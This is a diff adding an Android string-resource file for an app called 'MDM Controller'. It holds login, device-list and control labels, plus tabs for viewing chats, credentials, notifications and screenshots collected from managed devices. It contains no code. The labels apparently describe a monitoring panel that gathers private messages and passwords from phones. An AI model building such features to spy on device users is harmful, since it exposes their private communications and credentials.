@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">MDM Controller</string>
+    
+    <!-- Auth -->
+    <string name="login">Login</string>
+    <string name="logout">Logout</string>
+    <string name="email">Email</string>
+    <string name="password">Password</string>
+    <string name="username">Username</string>
+    <string name="admin_login">Admin Login</string>
+    <string name="device_owner_login">Device Owner Login</string>
+    <string name="login_type_admin">Admin</string>
+    <string name="login_type_device_owner">Device Owner</string>
+    <string name="invalid_credentials">Invalid credentials</string>
+    <string name="login_success">Login successful</string>
+    <string name="login_failed">Login failed</string>
+    
+    <!-- Devices -->
+    <string name="devices">Devices</string>
+    <string name="device_list">Device List</string>
+    <string name="device_details">Device Details</string>
+    <string name="no_devices">No devices found</string>
+    <string name="device_offline">Offline</string>
+    <string name="device_online">Online</string>
+    <string name="last_seen">Last seen: %1$s</string>
+    <string name="model">Model: %1$s</string>
+    <string name="os_version">OS: %1$s</string>
+    
+    <!-- MDM Controls -->
+    <string name="mdm_controls">MDM Controls</string>
+    <string name="capture_screenshot">Capture Screenshot</string>
+    <string name="sync_data">Sync Data</string>
+    <string name="update_app">Update App</string>
+    <string name="restart_service">Restart Service</string>
+    <string name="command_sent">Command sent successfully</string>
+    <string name="command_failed">Failed to send command</string>
+    <string name="view_only_access">View-only access. Contact admin for device control.</string>
+    
+    <!-- Navigation -->
+    <string name="nav_devices">Devices</string>
+    <string name="nav_settings">Settings</string>
+    
+    <!-- Common -->
+    <string name="loading">Loading…</string>
+    <string name="error">Error</string>
+    <string name="retry">Retry</string>
+    <string name="cancel">Cancel</string>
+    <string name="save">Save</string>
+    <string name="server_url">Server URL</string>
+    <string name="server_url_required">Server URL is required</string>
+    <string name="invalid_url">Invalid URL format</string>
+    <string name="settings_saved">Settings saved successfully</string>
+    <string name="server_url_hint">Enter the base URL of your MDM server (e.g., https://your-server.com/)</string>
+    
+    <!-- Data Tabs -->
+    <string name="tab_notifications">Notifications</string>
+    <string name="tab_chats">Chats</string>
+    <string name="tab_credentials">Credentials</string>
+    <string name="tab_screenshots">Screenshots</string>
+    <string name="tab_commands">Commands</string>
+    <string name="tab_mdm_controls">MDM Controls</string>
+    <string name="device_data">Device Data</string>
+    
+    <!-- Data Viewing -->
+    <string name="no_data">No data available</string>
+    <string name="no_notifications">No notifications found</string>
+    <string name="no_chats">No chats found</string>
+    <string name="no_credentials">No credentials found</string>
+    <string name="no_screenshots">No screenshots found</string>
+    <string name="no_commands">No commands found</string>
+</resources>
